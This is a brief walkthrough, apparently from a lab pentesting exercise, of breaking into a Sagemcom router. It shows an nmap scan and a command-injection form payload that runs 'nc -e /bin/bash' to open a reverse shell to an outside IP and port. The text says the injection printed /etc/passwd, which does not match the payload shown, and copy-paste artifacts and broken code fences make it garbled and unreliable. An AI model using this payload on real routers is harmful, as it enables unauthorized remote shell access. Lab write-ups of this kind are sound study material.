# Anas-EPI-Basic-pentesting-2-walkthrough-


markdown
Copy code
# Walkthrough: Hacking into Sagemcom Router

This walkthrough outlines the steps taken to gain unauthorized access to a Sagemcom router, exploiting various vulnerabilities and weaknesses.

## Initial Reconnaissance

I started with a port scan using nmap to identify open ports on the target:

```bash
nmap -A -sC -sV -p- 192.168.42.160
This revealed 2 open ports.

## Exploiting Command Injection
After discovering a correct username and password combination, I captured the request in Burp Suite and attempted a simple command injection attack, successfully printing out the /etc/passwd file:

bash
Copy code
radio=ls+-l|nc -e /bin/bash 192.168.43.2 9898&submit=Run
